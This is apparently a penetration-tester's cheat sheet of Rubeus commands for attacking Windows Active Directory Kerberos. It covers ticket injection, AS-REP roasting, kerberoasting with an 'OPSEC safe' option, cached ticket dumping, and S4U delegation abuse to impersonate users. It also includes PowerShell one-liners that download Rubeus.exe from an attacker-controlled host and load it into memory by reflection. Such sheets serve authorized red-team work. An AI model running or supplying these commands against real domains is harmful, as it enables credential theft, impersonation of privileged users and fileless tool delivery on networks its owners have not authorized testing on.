# rubeus

% ad, windows, rubeus

## inject ticket from file
#assessment/AD #target/local #cat/UTILS  
```cmd
.\Rubeus.exe ptt /ticket:<ticket>
```

## load rubeus from powershell
#assessment/AD #target/local #cat/UTILS 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
```

## execute rubeus from powershell
#assessment/AD #target/remote #cat/UTILS 
```powershell
[Rubeus.Program]::MainString("klist");
```

## monitor
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe monitor /interval:5 /filteruser:<machine_account>
```

## inject ticket from b64 blob
#assessment/AD #target/local #cat/UTILS  
```cmd
.\Rubeus.exe ptt /ticket:<BASE64BLOBHERE>
```

## check ASPREPRoast for all users in current domain
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /format:<AS_REP_response_format> /outfile:<output_hashes_file>
```

## ASREPRoast specific user
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>
```

## kerberoasting - current domain
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

## Kerberoasting and outputting on a file with a specific format
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>
```

## Kerberoasting while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec
```

## Kerberoast AES enabled accounts
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /aes
```
 
## Kerberoast specific user account
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<user> /simple
```

## get hash
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```cmd
.\Rubeus.exe hash /user:<user> /domain:<domain_name> /password:<password>
```

## dump - will dump any relevant cached TGS ticket’s stored
#assessment/AD #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe dump
```

## ask and inject ticket
#assessment/AD #target/remote #cat/ATTACK/CONNECT 
```
.\Rubeus.exe asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt
```

## S4U - with ticket - Constrained delegation
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt
```

## S4U - with hash - Constrained delegation
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt
```

## get rc4 of machine with the password
#assessment/AD #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe hash /password:<machine_password>
```

## S4U - Resource based constrained delegation
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt
```

## Rubeus Reflection assembly
#assessment/AD #target/remote #cat/ATTACK/EXPLOIT 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("<rubeus_cmd>".Split())
```

= ticket : c:\Temp\ticket.kirbi
= domain_fqdn : MYDC.mydomain.local
= domain_name : mydomain.local
= AS_REP_response_format : hashcat
